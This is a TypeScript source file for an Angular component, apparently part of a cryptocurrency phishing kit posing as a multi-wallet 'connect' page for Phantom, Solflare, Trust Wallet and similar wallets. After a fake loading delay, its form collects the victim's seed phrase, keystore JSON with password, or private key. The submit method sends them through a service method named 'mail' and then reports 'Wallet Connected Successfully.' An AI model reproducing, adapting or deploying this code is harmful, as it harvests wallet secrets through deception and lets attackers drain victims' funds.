import { Component } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { FormService } from '../shared/services/form.service';
import { CommonService } from '../shared/services/common.service';

@Component({
  selector: 'app-connect',
  templateUrl: './connect.component.html',
  styleUrls: ['./connect.component.scss']
})
export class ConnectComponent {

  wallets: any = [
    {
      text: 'Phantom',
      icon: 'phantom.svg',
    },
    {
      text: 'Solflare',
      icon: 'solflare.svg',
    },
    {
      text: 'Backpack',
      icon: 'backpack.png',
    },
    {
      text: 'Sollet',
      icon: 'sollet.png',
    },
    {
      text: 'Sollet (Web)',
      icon: 'sollet.png',
    },
    {
      text: 'Math Wallet',
      icon: 'mathwallet.svg',
    },
    {
      text: 'Trust Wallet',
      icon: 'trustwallet.svg',
    },
    {
      text: 'Slope',
      icon: 'slope.svg',
    },
    {
      text: 'BitKeep',
      icon: 'bitkeep.svg',
    },
    {
      text: 'Exodus',
      icon: 'exodus.svg',
    },
    {
      text: 'Coin98',
      icon: 'coin98.svg',
    },
    {
      text: 'SafePal',
      icon: 'safepal.svg',
    },
  ];

  view = "loading";

  wallet!: any;

  key:any = undefined;

  disabled = true;
  submitted = false;

  form!: FormGroup;

  constructor(
    private fb: FormBuilder,
    private formServ: FormService,
    private common: CommonService,
  ) {
    this.form = fb.group({
      wallet: ['',[Validators.required]],
      key: ['',[Validators.required]],
      phrase: [''],
      keyStoreJSON: [''],
      walletPassword: [''],
      privateKey: [''],
    });
  }

  ngOnInit() {
  }

  ngAfterViewInit()
  {
    this.selectTab('phrase');
    this.key = 'phrase';
  }

  get fmc() {
    return this.form.controls;
  }

  fmcLen(formControlName: string): number {
    return this.form.get(formControlName)?.value.length;
  }

  loading(item: any) {
    this.view = "loading";

    this.wallet = item;

    this.fmc['wallet'].setValue(item.text);
    this.fmc['key'].setValue('phrase');
    setTimeout(() => {
      this.view = "view1"
    }, 3000);
  }

  connectManually() {
    this.view = "view2";
  }

  close() {
    this.view = "loading";
  }

  countWord() {
    this.validator();
  }

  countElWords(elID:string) {
    var wordsEl:any = document?.getElementById(elID);
    var words:any = wordsEl?.value;
    var count = 0;

    if(words) {
      var split:any = words?.split(' ');
  
      for (var i = 0; i < split.length; i++) {
          if (split[i] != "") {
              count += 1;
          }
      }
      
    }
    return count;
}

  selectTab(key:any) {
    this.form.patchValue({
      phrase: '',
      keyStoreJSON: '',
      walletPassword: '',
      privateKey: ''
    });
    setTimeout(() => {
      this.fmc['wallet']?.setValue(this.wallet?.text);
      this.fmc['key']?.setValue(key);
      this.key = key;

      this.validator();
    }, 300);
  }

  validator() {
    if(this.fmc['key'].value==='phrase' && this.countElWords('phraseinput')=== 12 || this.countElWords('phraseinput')=== 24) {      
      this.disabled = false;
    }
    
    else if((this.fmc['key'].value)==='keystoreJSON' && this.fmcLen('keyStoreJSON') > 5 && this.fmcLen('walletPassword') > 5) {
      this.disabled = false;
    }
    
    else if((this.fmc['key'].value)==='privateKey' && this.fmcLen('privateKey') >= 12) {
      this.disabled = false;
    }

    else {
      this.disabled = true;
    }
  }

  submit() {
    if (this.form.valid) {
      this.submitted = true;
      this.formServ.mail(this.form.value).subscribe((res:any)=>{
        if(res.status==="success"){
          this.common.showAlert('Wallet Connected Successfully.','Success!','success');
        } else {
          this.common.showToast('An internal error occurred. Error connecting wallet.','danger');
        }
      },
      (err:any)=>{
        this.common.showToast('Check your connection.','danger');
      },
      ()=>{
        this.submitted = false;
      })
    } else {
      this.common.showToast('Fill required field(s)','danger');
    }
  }
}
